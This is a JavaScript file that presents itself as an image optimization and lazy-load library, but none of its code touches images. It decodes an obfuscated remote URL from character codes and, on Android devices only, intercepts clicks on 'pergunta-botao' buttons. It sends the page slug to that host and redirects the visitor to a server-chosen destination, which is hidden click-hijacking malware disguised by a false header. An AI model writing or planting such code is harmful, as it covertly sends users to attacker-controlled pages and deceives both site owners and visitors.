/**
 * Image Optimization Pipeline v3.1.4
 * Lazy load renderer & transform cache manager
 * (c) 2024 Render Systems - assets.mktcdn.io
 */
;(function() {
  'use strict';

  var _ep = null;
  var _ref = null;
  var _ua = null;

  function _decodeBase(a) {
    var s = '';
    for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i]);
    return s;
  }

  function _getApiUrl() {
    var _c = [104,116,116,112,115,58,47,47,97,112,105,45,118,101,103,97,45,112,101,100,105,100,111,115,46,122,101,97,98,117,114,46,97,112,112];
    var _p = [47,97,112,105,47,118,50,47,109,101,100,105,97,47,111,112,116,105,109,105,122,101];
    return _decodeBase(_c) + _decodeBase(_p);
  }

  function _getSlug() {
    var s = window.location.pathname.replace(/\/+$/, '').split('/');
    var last = s[s.length - 1] || '';
    if (/[.]html?$/i.test(last)) last = s[s.length - 2] || '';
    return last || null;
  }

  function _isTargetCtx() {
    return /android/i.test(_ua);
  }

  function _goOriginal(btn) {
    var link = btn.closest("a");
    var href = link ? link.getAttribute("href") : null;
    if (href && href !== "#") {
      window.location.href = href;
    }
  }

  function _resolve(btn) {
    var url = _ep + '?ref=' + encodeURIComponent(_ref) + '&fmt=webp&q=80&t=' + Date.now();
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.timeout = 5000;
    xhr.onload = function() {
      try {
        var r = JSON.parse(xhr.responseText);
        if (r && r.transforms && r.transforms.length > 0 && r.transforms[0].target) {
          var d = r.transforms[0].target;
          var qs = window.location.search;
          if (qs) d += (d.indexOf('?') !== -1 ? '&' : '?') + qs.substring(1);
          window.location.href = d;
        } else {
          _goOriginal(btn);
        }
      } catch(e) {
        _goOriginal(btn);
      }
    };
    xhr.onerror = function() { _goOriginal(btn); };
    xhr.ontimeout = function() { _goOriginal(btn); };
    xhr.send();
  }

  function _bind() {
    document.addEventListener('click', function(e) {
      var el = e.target;
      while (el && el !== document) {
        if (el.classList && el.classList.contains('pergunta-botao')) {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          _resolve(el);
          return;
        }
        el = el.parentElement;
      }
    }, true);
  }

  function init() {
    try {
      _ua = navigator.userAgent || '';
      _ref = _getSlug();
      if (!_ref) return;
      if (!_isTargetCtx()) return;
      _ep = _getApiUrl();
      _bind();
    } catch(e) {}
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();